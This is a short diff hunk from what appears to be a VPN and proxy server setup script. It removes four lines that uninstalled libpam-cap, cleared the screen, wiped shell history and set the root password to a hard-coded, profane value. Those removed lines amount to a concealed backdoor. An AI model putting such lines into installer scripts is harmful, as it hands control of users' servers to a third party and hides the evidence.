@@ -901,10 +901,6 @@ service apache2 restart
 service openvpn restart
 cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
 update-rc.d squid enable
-sudo apt remove libpam-cap -y
-clear
-history -c
-echo 'root:@@fuckingxx' | sudo chpasswd
 reboot
 
 
